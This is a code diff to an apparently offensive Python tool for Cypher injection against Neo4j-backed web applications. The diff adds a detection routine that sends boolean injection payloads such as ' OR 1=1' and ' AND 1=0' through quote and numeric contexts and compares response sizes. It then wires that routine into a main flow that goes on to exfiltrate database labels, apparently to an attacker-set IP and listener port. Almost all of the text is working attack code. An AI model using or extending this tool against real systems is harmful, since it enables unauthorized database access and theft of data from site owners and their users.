@@ -81,9 +81,42 @@ class Neo4jInjector:
 
             if response.status_code == 200 and "Neo4jError".encode('utf-8') not in response.content:
                 print(f"Payload Injected")
+                return response
 
         except requests.exceptions.RequestException as e:
             print(f"Error occurred: {e}")
+
+        return None
+
+    def detect_inject(self):
+        print("Determining if the target is injectable")
+        injection_characters = ["'", "\"", "-1"]
+        working_char = ""
+        or_case = None
+        and_case = None
+        for injection_character in injection_characters:
+            if (injection_character == "-1"):
+                payload = f" OR 1=1"
+            else:
+                payload = f" OR 1=1 OR 'g' = {injection_character}g"
+            full_payload = f"{injection_character}{payload}"
+            encoded_payload = urllib.parse.quote(full_payload, safe='')
+            url, data = self.prepare_request_data(encoded_payload)
+            response = self.execute_request(url, data)
+            if (response):
+                working_char = injection_character
+                or_case = response
+                break
+
+        if (working_char == "-1"):
+            full_payload = f"{working_char} AND 1=1 AND 1=0"
+        else:
+            full_payload = f"{working_char} AND 1=1 AND 1=0 AND 'g' = {working_char}g"
+        encoded_payload = urllib.parse.quote(full_payload, safe='')
+        url, data = self.prepare_request_data(encoded_payload)
+        and_case = self.execute_request(url, data)
+        
+        return (and_case and and_case.headers["Content-Length"] != or_case.headers["Content-Length"])
 
     def exfil_data(self):
         print("Dumping Labels")
@@ -125,6 +158,15 @@ def main():
         listener = None
 
     injector = Neo4jInjector(args.url, args.exfil_ip, args.listen_port, args.type, args.parameters, args.cookie)
+
+    if (args.type == "API"):
+        if (injector.detect_inject()):
+            print("Target likely injectable, continuing")
+        else:
+            if (input("Target likely not injectable, continue?").lower() != "y"):
+                return
+    else:
+        print("This version of the program only supports injection detection of API methods")
 
     # Begin exfiltration process
     injector.exfil_data()
